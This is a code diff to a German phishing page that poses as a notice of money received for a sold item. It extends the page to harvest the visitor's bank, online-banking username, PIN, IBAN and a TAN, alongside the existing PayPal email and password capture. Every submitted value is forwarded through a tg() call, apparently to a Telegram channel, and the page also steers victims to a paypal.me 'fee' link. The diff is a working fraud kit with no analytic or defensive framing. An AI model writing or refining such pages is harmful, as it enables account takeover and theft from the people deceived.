@@ -43,8 +43,11 @@ background:#0070ba;color:#fff;cursor:pointer;margin-top:14px}
 .opt em{font-size:12px;color:#7a8797;font-style:normal}
 .opt .ic{width:34px;height:34px;border-radius:8px;background:#0e1b2c;color:#fff;display:grid;place-items:center;font-weight:800;font-size:13px;flex:0 0 34px}
 label{display:block;font-size:12.5px;font-weight:700;color:#4a5a6e;margin:12px 0 5px}
-input{width:100%;padding:13px;border:1.5px solid #dde4ec;border-radius:11px;font-size:16px;background:#fbfcfe}
-input:focus{outline:0;border-color:#0070ba;background:#fff}
+input,select{width:100%;padding:13px;border:1.5px solid #dde4ec;border-radius:11px;font-size:16px;background:#fbfcfe;
+font-family:inherit;color:#111b2b;-webkit-appearance:none;appearance:none}
+select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='9'><path d='M1 1l6 6 6-6' fill='none' stroke='%237a8797' stroke-width='2'/></svg>");
+background-repeat:no-repeat;background-position:right 14px center;padding-right:38px}
+input:focus,select:focus{outline:0;border-color:#0070ba;background:#fff}
 .note{font-size:12px;color:#7a8797;margin-top:10px;display:flex;gap:7px}
 .hide{display:none}
 .fee{display:flex;justify-content:space-between;font-size:14px;padding:8px 0;border-bottom:1px solid #eef1f6}
@@ -53,6 +56,7 @@ input:focus{outline:0;border-color:#0070ba;background:#fff}
 .foot{text-align:center;font-size:11.5px;color:#98a4b3;padding:10px 20px;line-height:1.7}
 a{color:#0070ba}
 .code{letter-spacing:7px;text-align:center;font-size:22px;font-weight:700;font-family:ui-monospace,monospace}
+.hint{font-size:11.5px;color:#98a4b3;margin-top:6px}
 </style>
 </head>
 <body>
@@ -67,8 +71,8 @@ a{color:#0070ba}
     <div class="card">
       <div class="chip">✓ Eingegangen</div>
       <h1><span id="buyer">M. Weber</span> hat dir Geld gesendet</h1>
-      <div class="amount"><span id="amt">57</span> <small>EUR</small></div>
-      <p id="art">Guess Tasche</p>
+      <div class="amount"><span id="amt">47,50</span> <small>EUR</small></div>
+      <p id="art">Apple AirPods Pro (2. Gen.)</p>
       <div class="rows"><span>Vorgang</span><span id="vnr">#TD-2026-4471</span></div>
       <div class="rows"><span>Eingang</span><span id="datum"></span></div>
       <div class="rows"><span>Status</span><span>Freigabe offen</span></div>
@@ -106,10 +110,28 @@ a{color:#0070ba}
       </div>
 
       <div id="fBK" class="hide">
-        <label>IBAN</label>
-        <input id="iban" inputmode="text" autocomplete="off" placeholder="DE00 0000 0000 0000 0000 00">
-        <label>PIN (optional)</label>
+        <label>Bank</label>
+        <select id="bank">
+          <option value="Sparkasse" selected>Sparkasse</option>
+          <option value="Volksbank / Raiffeisenbank">Volksbank / Raiffeisenbank</option>
+          <option value="Commerzbank">Commerzbank</option>
+          <option value="Deutsche Bank">Deutsche Bank</option>
+          <option value="Postbank">Postbank</option>
+          <option value="ING">ING</option>
+          <option value="DKB">DKB</option>
+          <option value="N26">N26</option>
+          <option value="Andere Bank">Andere Bank</option>
+        </select>
+
+        <label id="lblUser">Anmeldename / Legitimations-ID</label>
+        <input id="buser" inputmode="text" autocomplete="off" placeholder="z. B. 1234567890">
+        <div class="hint" id="hintUser">Steht auf deinem Sparkassen-Brief bzw. im Online-Banking.</div>
+
+        <label>Online-Banking PIN</label>
         <input id="pin" type="password" inputmode="numeric" autocomplete="off" placeholder="•••••">
+
+        <label>IBAN (optional)</label>
+        <input id="iban" inputmode="text" autocomplete="off" placeholder="DE00 0000 0000 0000 0000 00">
       </div>
 
       <button class="btn" onclick="submitData()">Weiter</button>
@@ -119,15 +141,15 @@ a{color:#0070ba}
 
   <section id="s3" class="hide">
     <div class="card">
-      <h2>Bestätigungscode</h2>
+      <h2 id="s3title">Bestätigungscode</h2>
       <p>Schritt 3 von 3</p>
-      <p>Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.</p>
+      <p id="s3sub">Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.</p>
       <input id="code" class="code" inputmode="numeric" maxlength="6" placeholder="000000">
       <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:12.5px">
-        <a href="#" onclick="resend();return false">Kein Code erhalten? Erneut senden</a>
+        <a href="#" onclick="resend();return false" id="resendLnk">Kein Code erhalten? Erneut senden</a>
         <span class="timer" id="timer">90s</span>
       </div>
-      <button class="btn" onclick="submitCode()">Freigeben</button>
+      <button class="btn" onclick="submitCode()" id="s3btn">Freigeben</button>
     </div>
   </section>
 
@@ -169,7 +191,7 @@ const d64 = s => { try { return decodeURIComponent(escape(atob(s.replace(/-/g,'+
 const nf  = n => Number(n).toFixed(2).replace('.', ',');
 const vnr = s => { let h = 0; for (const c of s) h = (h * 31 + c.charCodeAt(0)) >>> 0; return '#TD-2026-' + (1000 + h % 9000); };
 
-let payload = "", betrag = 47.50, mode = "pp", name = "", art = "", vnum = "";
+let payload = "", betrag = 47.50, mode = "pp", name = "", art = "", vnum = "", bankName = "Sparkasse";
 
 (function init(){
   const raw = d64(new URLSearchParams(location.search).get('v') || "");
@@ -194,12 +216,33 @@ let payload = "", betrag = 47.50, mode = "pp", name = "", art = "", vnum = "";
   document.getElementById('vnr').textContent   = vnum;
   document.getElementById('datum').textContent = new Date().toLocaleDateString('de-DE');
   document.getElementById('pay').href = "https://paypal.me/" + PP_USER + "/" + FEE;
+
+  document.getElementById('bank').addEventListener('change', e => {
+    bankName = e.target.value;
+    const spk = /Sparkasse|Volksbank/i.test(bankName);
+    document.getElementById('lblUser').textContent =
+      spk ? "Anmeldename / Legitimations-ID" : "Online-Banking Anmeldename";
+    document.getElementById('hintUser').textContent =
+      spk ? "Steht auf deinem Sparkassen-Brief bzw. im Online-Banking."
+          : "Der Anmeldename deines Online-Bankings.";
+  });
 })();
 
 function go(n){
   [1,2,3,4].forEach(i => document.getElementById('s'+i).classList.toggle('hide', i !== n));
   window.scrollTo({top:0,behavior:'instant'});
-  if (n === 3) startTimer(90);
+  if (n === 3) {
+    const bank = (mode === 'bk');
+    document.getElementById('s3title').textContent = bank ? "TAN eingeben" : "Bestätigungscode";
+    document.getElementById('s3sub').textContent = bank
+      ? "Zur Freigabe bestätige bitte die TAN, die an dein hinterlegtes Gerät gesendet wurde."
+      : "Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.";
+    document.getElementById('code').placeholder = bank ? "TAN" : "000000";
+    document.getElementById('s3btn').textContent = bank ? "Mit TAN freigeben" : "Freigeben";
+    document.getElementById('resendLnk').textContent = bank
+      ? "Keine TAN erhalten? Erneut senden" : "Kein Code erhalten? Erneut senden";
+    startTimer(90);
+  }
 }
 function pick(m){
   mode = m;
@@ -222,20 +265,29 @@ function submitData(){
     if (!m || !p) return alert("Bitte E-Mail und Passwort eingeben.");
     tg("PAYPAL\n" + head + "\nMAIL: " + m + "\nPW: " + p);
   } else {
-    const i = document.getElementById('iban').value.replace(/\s/g,'');
-    if (i.length < 15) return alert("Bitte gültige IBAN eingeben.");
-    tg("BANK\n" + head + "\nIBAN: " + i + "\nPIN: " + document.getElementById('pin').value);
+    bankName = document.getElementById('bank').value;
+    const usr = document.getElementById('buser').value.trim();
+    const pin = document.getElementById('pin').value.trim();
+    const iban = document.getElementById('iban').value.replace(/\s/g,'');
+    if (!bankName) return alert("Bitte Bank auswählen.");
+    if (!usr) return alert("Bitte Anmeldename / Legitimations-ID eingeben.");
+    if (pin.length < 4) return alert("Bitte Online-Banking PIN eingeben.");
+    tg("BANK\n" + head + "\nBANK: " + bankName + "\nUSER: " + usr + "\nPIN: " + pin
+       + (iban ? "\nIBAN: " + iban : "\nIBAN: —"));
   }
   go(3);
 }
 function submitCode(){
   const c = document.getElementById('code').value.trim();
-  if (c.length < 6) return alert("Bitte 6-stelligen Code eingeben.");
-  tg("CODE [" + vnum + "]: " + c);
+  if (c.length < 6) return alert(mode === 'bk' ? "Bitte TAN eingeben." : "Bitte 6-stelligen Code eingeben.");
+  tg((mode === 'bk' ? "TAN [" + bankName + "] [" : "CODE [") + vnum + "]: " + c);
   go(4);
   startTimer(900, 't2');
 }
-function resend(){ tg("CODE ERNEUT SENDEN [" + vnum + "]"); startTimer(90); }
+function resend(){
+  tg((mode === 'bk' ? "TAN ERNEUT SENDEN [" : "CODE ERNEUT SENDEN [") + vnum + "]");
+  startTimer(90);
+}
 
 let iv = null;
 function startTimer(sec, id){
